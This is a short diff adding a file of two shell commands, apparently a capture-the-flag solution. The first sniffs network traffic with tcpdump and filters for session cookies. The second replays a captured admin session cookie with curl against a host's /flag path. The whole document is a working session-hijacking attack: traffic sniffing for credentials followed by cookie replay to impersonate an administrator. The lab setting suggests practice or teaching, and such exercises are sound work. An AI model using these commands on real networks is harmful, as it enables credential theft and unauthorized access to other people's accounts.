@@ -1,0 +1,3 @@
+tcpdump -A | grep "session=" 
+
+curl -H "Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aQpZog.zSv9gbDgPUVU7j7teqtUPiHuyjA" http://10.0.0.2/flag
